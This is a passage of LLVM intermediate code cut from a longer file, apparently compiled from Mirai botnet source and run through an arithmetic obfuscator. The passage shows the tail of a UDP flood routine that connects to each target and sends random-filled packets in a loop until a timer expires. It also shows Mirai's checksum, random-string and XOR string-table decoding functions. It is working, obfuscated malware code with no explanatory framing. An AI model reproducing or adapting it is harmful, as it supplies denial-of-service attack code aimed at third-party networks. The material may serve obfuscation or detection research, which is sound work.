  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = sub i64 %51, 4993410759522530302
  %55 = add i64 %54, %53
  %56 = add i64 %55, 4993410759522530302
  %57 = add nsw i64 %51, %53
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %19, align 4
  %59 = load i16, i16* %15, align 2
  %60 = zext i16 %59 to i32
  %61 = icmp eq i32 %60, 65535
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %5
  %63 = call i32 @rand_next()
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %15, align 2
  br label %68

; <label>:65:                                     ; preds = %5
  %66 = load i16, i16* %15, align 2
  %67 = call zeroext i16 @htons(i16 zeroext %66) #7
  store i16 %67, i16* %15, align 2
  br label %68

; <label>:68:                                     ; preds = %65, %62
  store i32 0, i32* %11, align 4
  br label %69

; <label>:69:                                     ; preds = %183, %68
  %70 = load i32, i32* %11, align 4
  %71 = load i8, i8* %7, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %70, %72
  br i1 %73, label %74, label %190

; <label>:74:                                     ; preds = %69
  %75 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %76 = load i8**, i8*** %12, align 8
  %77 = load i32, i32* %11, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8*, i8** %76, i64 %78
  store i8* %75, i8** %79, align 8
  %80 = load i16, i16* %14, align 2
  %81 = zext i16 %80 to i32
  %82 = icmp eq i32 %81, 65535
  br i1 %82, label %83, label %92

; <label>:83:                                     ; preds = %74
  %84 = call i32 @rand_next()
  %85 = trunc i32 %84 to i16
  %86 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 0
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %90, i32 0, i32 1
  store i16 %85, i16* %91, align 2
  br label %101

; <label>:92:                                     ; preds = %74
  %93 = load i16, i16* %14, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %93) #7
  %95 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %96 = load i32, i32* %11, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 1
  store i16 %94, i16* %100, align 2
  br label %101

; <label>:101:                                    ; preds = %92, %83
  %102 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %103 = load i32*, i32** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i32, i32* %103, i64 %105
  store i32 %102, i32* %106, align 4
  %107 = icmp eq i32 %102, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %101
  br label %237

; <label>:109:                                    ; preds = %101
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %110, align 4
  %111 = load i16, i16* %15, align 2
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %111, i16* %112, align 2
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %114 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %113, i32 0, i32 0
  store i32 0, i32* %114, align 4
  %115 = load i32*, i32** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  %119 = load i32, i32* %118, align 4
  %120 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %121 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %121, %struct.sockaddr** %120, align 8
  %122 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %123 = load %struct.sockaddr*, %struct.sockaddr** %122, align 8
  %124 = call i32 @bind(i32 %119, %struct.sockaddr* %123, i32 16) #6
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %109
  br label %127

; <label>:127:                                    ; preds = %126, %109
  %128 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %129 = load i32, i32* %11, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %128, i64 %130
  %132 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %131, i32 0, i32 2
  %133 = load i8, i8* %132, align 4
  %134 = zext i8 %133 to i32
  %135 = icmp slt i32 %134, 32
  br i1 %135, label %136, label %164

; <label>:136:                                    ; preds = %127
  %137 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %138 = load i32, i32* %11, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i64 %139
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i32 0, i32 1
  %142 = load i32, i32* %141, align 4
  %143 = call i32 @ntohl(i32 %142) #7
  %144 = call i32 @rand_next()
  %145 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %146 = load i32, i32* %11, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i64 %147
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i32 0, i32 2
  %150 = load i8, i8* %149, align 4
  %151 = zext i8 %150 to i32
  %152 = lshr i32 %144, %151
  %153 = sub i32 0, %152
  %154 = sub i32 %143, %153
  %155 = add i32 %143, %152
  %156 = call i32 @htonl(i32 %154) #7
  %157 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 0
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %161, i32 0, i32 2
  %163 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %162, i32 0, i32 0
  store i32 %156, i32* %163, align 4
  br label %164

; <label>:164:                                    ; preds = %136, %127
  %165 = load i32*, i32** %13, align 8
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i32, i32* %165, i64 %167
  %169 = load i32, i32* %168, align 4
  %170 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %171 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %172 = load i32, i32* %11, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i64 %173
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i32 0, i32 0
  %176 = bitcast %struct.sockaddr_in* %175 to %struct.sockaddr*
  store %struct.sockaddr* %176, %struct.sockaddr** %170, align 8
  %177 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %178 = load %struct.sockaddr*, %struct.sockaddr** %177, align 8
  %179 = call i32 @connect(i32 %169, %struct.sockaddr* %178, i32 16)
  %180 = icmp eq i32 %179, -1
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %164
  br label %182

; <label>:182:                                    ; preds = %181, %164
  br label %183

; <label>:183:                                    ; preds = %182
  %184 = load i32, i32* %11, align 4
  %185 = sub i32 0, %184
  %186 = sub i32 0, 1
  %187 = add i32 %185, %186
  %188 = sub i32 0, %187
  %189 = add nsw i32 %184, 1
  store i32 %188, i32* %11, align 4
  br label %69

; <label>:190:                                    ; preds = %69
  br label %191

; <label>:191:                                    ; preds = %236, %190
  store i32 0, i32* %11, align 4
  br label %192

; <label>:192:                                    ; preds = %223, %191
  %193 = load i32, i32* %11, align 4
  %194 = load i8, i8* %7, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp slt i32 %193, %195
  br i1 %196, label %197, label %230

; <label>:197:                                    ; preds = %192
  %198 = load i8**, i8*** %12, align 8
  %199 = load i32, i32* %11, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i8*, i8** %198, i64 %200
  %202 = load i8*, i8** %201, align 8
  store i8* %202, i8** %25, align 8
  %203 = load i8, i8* %17, align 1
  %204 = icmp ne i8 %203, 0
  br i1 %204, label %205, label %213

; <label>:205:                                    ; preds = %197
  %206 = load i8*, i8** %25, align 8
  %207 = load i16, i16* %16, align 2
  %208 = zext i16 %207 to i32
  call void @rand_alpha_str(i8* %206, i32 %208)
  %209 = load i8*, i8** %25, align 8
  %210 = load i16, i16* %16, align 2
  %211 = zext i16 %210 to i64
  %212 = getelementptr inbounds i8, i8* %209, i64 %211
  store i8 0, i8* %212, align 1
  br label %213

; <label>:213:                                    ; preds = %205, %197
  %214 = load i32*, i32** %13, align 8
  %215 = load i32, i32* %11, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds i32, i32* %214, i64 %216
  %218 = load i32, i32* %217, align 4
  %219 = load i8*, i8** %25, align 8
  %220 = load i16, i16* %16, align 2
  %221 = zext i16 %220 to i64
  %222 = call i64 @send(i32 %218, i8* %219, i64 %221, i32 16384)
  br label %223

; <label>:223:                                    ; preds = %213
  %224 = load i32, i32* %11, align 4
  %225 = sub i32 0, %224
  %226 = sub i32 0, 1
  %227 = add i32 %225, %226
  %228 = sub i32 0, %227
  %229 = add nsw i32 %224, 1
  store i32 %228, i32* %11, align 4
  br label %192

; <label>:230:                                    ; preds = %192
  %231 = call i64 @time(i64* null) #6
  %232 = load i32, i32* %19, align 4
  %233 = sext i32 %232 to i64
  %234 = icmp sgt i64 %231, %233
  br i1 %234, label %235, label %236

; <label>:235:                                    ; preds = %230
  br label %237

; <label>:236:                                    ; preds = %230
  br label %191

; <label>:237:                                    ; preds = %235, %108
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %20, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %26

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %14
  %16 = sub i64 0, %13
  %17 = add i64 %15, %16
  %18 = sub i64 0, %17
  %19 = add i64 %14, %13
  store i64 %18, i64* %5, align 8
  br label %20

; <label>:20:                                     ; preds = %9
  %21 = load i32, i32* %4, align 4
  %22 = sub i32 %21, 182904355
  %23 = sub i32 %22, 2
  %24 = add i32 %23, 182904355
  %25 = sub i32 %21, 2
  store i32 %24, i32* %4, align 4
  br label %6

; <label>:26:                                     ; preds = %6
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, 1
  br i1 %28, label %29, label %38

; <label>:29:                                     ; preds = %26
  %30 = load i16*, i16** %3, align 8
  %31 = load i16, i16* %30, align 2
  %32 = trunc i16 %31 to i8
  %33 = sext i8 %32 to i64
  %34 = load i64, i64* %5, align 8
  %35 = sub i64 0, %33
  %36 = sub i64 %34, %35
  %37 = add i64 %34, %33
  store i64 %36, i64* %5, align 8
  br label %38

; <label>:38:                                     ; preds = %29, %26
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 65535, -1
  %43 = xor i64 %41, %42
  %44 = and i64 %43, %41
  %45 = and i64 %41, 65535
  %46 = sub i64 0, %40
  %47 = sub i64 0, %44
  %48 = add i64 %46, %47
  %49 = sub i64 0, %48
  %50 = add i64 %40, %44
  store i64 %49, i64* %5, align 8
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = load i64, i64* %5, align 8
  %54 = sub i64 0, %53
  %55 = sub i64 0, %52
  %56 = add i64 %54, %55
  %57 = sub i64 0, %56
  %58 = add i64 %53, %52
  store i64 %57, i64* %5, align 8
  %59 = load i64, i64* %5, align 8
  %60 = xor i64 %59, -1
  %61 = and i64 -1, %60
  %62 = xor i64 -1, -1
  %63 = and i64 %59, %62
  %64 = or i64 %61, %63
  %65 = xor i64 %59, -1
  %66 = trunc i64 %64 to i16
  ret i16 %66
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %42

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, 462295514
  %32 = add i32 %31, %29
  %33 = sub i32 %32, 462295514
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = add i32 %37, 1014349328
  %39 = sub i32 %38, 2
  %40 = sub i32 %39, 1014349328
  %41 = sub nsw i32 %37, 2
  store i32 %40, i32* %8, align 4
  br label %23

; <label>:42:                                     ; preds = %23
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, 1
  br i1 %44, label %45, label %55

; <label>:45:                                     ; preds = %42
  %46 = load i16*, i16** %9, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = load i32, i32* %12, align 4
  %51 = sub i32 %50, -591893716
  %52 = add i32 %51, %49
  %53 = add i32 %52, -591893716
  %54 = add i32 %50, %49
  store i32 %53, i32* %12, align 4
  br label %55

; <label>:55:                                     ; preds = %45, %42
  %56 = load i32, i32* %10, align 4
  %57 = lshr i32 %56, 16
  %58 = xor i32 %57, -1
  %59 = xor i32 65535, -1
  %60 = xor i32 -2114724804, -1
  %61 = or i32 %58, %59
  %62 = or i32 -2114724804, %60
  %63 = xor i32 %61, -1
  %64 = and i32 %63, %62
  %65 = and i32 %57, 65535
  %66 = load i32, i32* %12, align 4
  %67 = add i32 %66, 2013479932
  %68 = add i32 %67, %64
  %69 = sub i32 %68, 2013479932
  %70 = add i32 %66, %64
  store i32 %69, i32* %12, align 4
  %71 = load i32, i32* %10, align 4
  %72 = xor i32 65535, -1
  %73 = xor i32 %71, %72
  %74 = and i32 %73, %71
  %75 = and i32 %71, 65535
  %76 = load i32, i32* %12, align 4
  %77 = sub i32 %76, -443521713
  %78 = add i32 %77, %74
  %79 = add i32 %78, -443521713
  %80 = add i32 %76, %74
  store i32 %79, i32* %12, align 4
  %81 = load i32, i32* %11, align 4
  %82 = lshr i32 %81, 16
  %83 = xor i32 %82, -1
  %84 = xor i32 65535, -1
  %85 = xor i32 807978371, -1
  %86 = or i32 %83, %84
  %87 = or i32 807978371, %85
  %88 = xor i32 %86, -1
  %89 = and i32 %88, %87
  %90 = and i32 %82, 65535
  %91 = load i32, i32* %12, align 4
  %92 = sub i32 0, %91
  %93 = sub i32 0, %89
  %94 = add i32 %92, %93
  %95 = sub i32 0, %94
  %96 = add i32 %91, %89
  store i32 %95, i32* %12, align 4
  %97 = load i32, i32* %11, align 4
  %98 = xor i32 65535, -1
  %99 = xor i32 %97, %98
  %100 = and i32 %99, %97
  %101 = and i32 %97, 65535
  %102 = load i32, i32* %12, align 4
  %103 = add i32 %102, 706428539
  %104 = add i32 %103, %100
  %105 = sub i32 %104, 706428539
  %106 = add i32 %102, %100
  store i32 %105, i32* %12, align 4
  %107 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %108 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %107, i32 0, i32 6
  %109 = load i8, i8* %108, align 1
  %110 = zext i8 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #7
  %112 = zext i16 %111 to i32
  %113 = load i32, i32* %12, align 4
  %114 = sub i32 %113, -2128983463
  %115 = add i32 %114, %112
  %116 = add i32 %115, -2128983463
  %117 = add i32 %113, %112
  store i32 %116, i32* %12, align 4
  %118 = load i16, i16* %7, align 2
  %119 = zext i16 %118 to i32
  %120 = load i32, i32* %12, align 4
  %121 = sub i32 0, %119
  %122 = sub i32 %120, %121
  %123 = add i32 %120, %119
  store i32 %122, i32* %12, align 4
  br label %124

; <label>:124:                                    ; preds = %128, %55
  %125 = load i32, i32* %12, align 4
  %126 = lshr i32 %125, 16
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %145

; <label>:128:                                    ; preds = %124
  %129 = load i32, i32* %12, align 4
  %130 = xor i32 %129, -1
  %131 = xor i32 65535, -1
  %132 = xor i32 -278611102, -1
  %133 = or i32 %130, %131
  %134 = or i32 -278611102, %132
  %135 = xor i32 %133, -1
  %136 = and i32 %135, %134
  %137 = and i32 %129, 65535
  %138 = load i32, i32* %12, align 4
  %139 = lshr i32 %138, 16
  %140 = sub i32 0, %136
  %141 = sub i32 0, %139
  %142 = add i32 %140, %141
  %143 = sub i32 0, %142
  %144 = add i32 %136, %139
  store i32 %143, i32* %12, align 4
  br label %124

; <label>:145:                                    ; preds = %124
  %146 = load i32, i32* %12, align 4
  %147 = xor i32 %146, -1
  %148 = and i32 -1, %147
  %149 = xor i32 -1, -1
  %150 = and i32 %146, %149
  %151 = or i32 %148, %150
  %152 = xor i32 %146, -1
  %153 = trunc i32 %151 to i16
  ret i16 %153
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 323341495, %15
  %17 = xor i32 323341495, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, 323341495
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 -881112428, %32
  %34 = xor i32 -881112428, -1
  %35 = and i32 %31, %34
  %36 = xor i32 %30, -1
  %37 = and i32 %36, -881112428
  %38 = and i32 %30, %34
  %39 = or i32 %33, %35
  %40 = or i32 %37, %38
  %41 = xor i32 %39, %40
  %42 = xor i32 %31, %30
  store i32 %41, i32* @w, align 4
  %43 = load i32, i32* %1, align 4
  %44 = load i32, i32* @w, align 4
  %45 = xor i32 %44, -1
  %46 = and i32 %43, %45
  %47 = xor i32 %43, -1
  %48 = and i32 %44, %47
  %49 = or i32 %46, %48
  %50 = xor i32 %44, %43
  store i32 %49, i32* @w, align 4
  %51 = load i32, i32* @w, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [64 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 39)
  %6 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 39, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %16, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 %10, 1810887865
  %12 = add i32 %11, -1
  %13 = add i32 %12, 1810887865
  %14 = add nsw i32 %10, -1
  store i32 %13, i32* %4, align 4
  %15 = icmp ne i32 %10, 0
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %9
  %17 = call i32 @rand_next()
  %18 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i32 0, i32 0
  %19 = call i32 @util_strlen(i8* %18)
  %20 = urem i32 %17, %19
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = load i8*, i8** %3, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %3, align 8
  store i8 %23, i8* %24, align 1
  br label %9

; <label>:26:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 39)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  store i32 0, i32* %3, align 4
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 255, -1
  %15 = xor i32 -334874001, -1
  %16 = or i32 %13, %14
  %17 = or i32 -334874001, %15
  %18 = xor i32 %16, -1
  %19 = and i32 %18, %17
  %20 = and i32 %12, 255
  %21 = trunc i32 %19 to i8
  store i8 %21, i8* %5, align 1
  %22 = load i32, i32* @table_key, align 4
  %23 = lshr i32 %22, 8
  %24 = xor i32 %23, -1
  %25 = xor i32 255, -1
  %26 = xor i32 -1507790876, -1
  %27 = or i32 %24, %25
  %28 = or i32 -1507790876, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %23, 255
  %32 = trunc i32 %30 to i8
  store i8 %32, i8* %6, align 1
  %33 = load i32, i32* @table_key, align 4
  %34 = lshr i32 %33, 16
  %35 = xor i32 %34, -1
  %36 = xor i32 255, -1
  %37 = xor i32 401407242, -1
  %38 = or i32 %35, %36
  %39 = or i32 401407242, %37
  %40 = xor i32 %38, -1
  %41 = and i32 %40, %39
  %42 = and i32 %34, 255
  %43 = trunc i32 %41 to i8
  store i8 %43, i8* %7, align 1
  %44 = load i32, i32* @table_key, align 4
  %45 = lshr i32 %44, 24
  %46 = xor i32 255, -1
  %47 = xor i32 %45, %46
  %48 = and i32 %47, %45
  %49 = and i32 %45, 255
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %142, %1
  %52 = load i32, i32* %3, align 4
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 1
  %55 = load i16, i16* %54, align 8
  %56 = zext i16 %55 to i32
  %57 = icmp slt i32 %52, %56
  br i1 %57, label %58, label %149

; <label>:58:                                     ; preds = %51
  %59 = load i8, i8* %5, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, -1
  %70 = and i32 %60, %69
  %71 = xor i32 %60, -1
  %72 = and i32 %68, %71
  %73 = or i32 %70, %72
  %74 = xor i32 %68, %60
  %75 = trunc i32 %73 to i8
  store i8 %75, i8* %66, align 1
  %76 = load i8, i8* %6, align 1
  %77 = zext i8 %76 to i32
  %78 = load %struct.table_value*, %struct.table_value** %4, align 8
  %79 = getelementptr inbounds %struct.table_value, %struct.table_value* %78, i32 0, i32 0
  %80 = load i8*, i8** %79, align 8
  %81 = load i32, i32* %3, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = load i8, i8* %83, align 1
  %85 = sext i8 %84 to i32
  %86 = xor i32 %85, -1
  %87 = and i32 1683386883, %86
  %88 = xor i32 1683386883, -1
  %89 = and i32 %85, %88
  %90 = xor i32 %77, -1
  %91 = and i32 %90, 1683386883
  %92 = and i32 %77, %88
  %93 = or i32 %87, %89
  %94 = or i32 %91, %92
  %95 = xor i32 %93, %94
  %96 = xor i32 %85, %77
  %97 = trunc i32 %95 to i8
  store i8 %97, i8* %83, align 1
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = load %struct.table_value*, %struct.table_value** %4, align 8
  %101 = getelementptr inbounds %struct.table_value, %struct.table_value* %100, i32 0, i32 0
  %102 = load i8*, i8** %101, align 8
  %103 = load i32, i32* %3, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  %106 = load i8, i8* %105, align 1
  %107 = sext i8 %106 to i32
  %108 = xor i32 %107, -1
